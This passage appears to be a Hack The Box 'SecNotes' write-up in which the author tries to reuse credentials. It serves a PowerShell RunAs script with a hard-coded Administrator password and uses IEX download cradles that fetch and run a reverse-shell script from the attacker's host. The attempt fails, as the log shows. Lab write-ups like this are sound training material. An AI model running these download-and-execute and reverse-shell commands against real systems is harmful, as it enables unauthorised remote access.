# RunAs to check for password reuse.

We have two creds here, one is tyler's the other is from the MySQL DB. First we host the RunAs.ps1 script with Python HTTP server
```shell
root@Kali:~/HTB/SecNotes# cat RunAs.ps1 
$secpasswd = ConvertTo-SecureString "92g!mA8BGjOirkL%OG*&" -AsPlainText -Force 
$mycreds = New-Object System.Management.Automation.PSCredential ("Administrator", $secpasswd)
Start-Process -FilePath "powershell.exe" -ArgumentList "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.78/rshell.ps1')" -Credential $mycreds
```

Then on target we do Powershell IEX
```shell
PS C:\Users\tyler\Temp> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.78/RunAs.ps1')
PS C:\Users\tyler\Temp> rshell : This command cannot be run due to the error: The user name or password is incorrect.
At line:90 char:1
+ rshell -Reverse -IPAddress 10.10.14.78 -Port 443
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,rshell
```
On the Python server we see that RunAs.ps1 was downloaded but not rshell.ps1 because the authentication failed.
```shell
root@Kali:~/HTB/SecNotes# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.97 - - [12/Oct/2020 23:37:48] "GET /RunAs.ps1 HTTP/1.1" 200 -
```
Same with the MySQL creds. Moving on.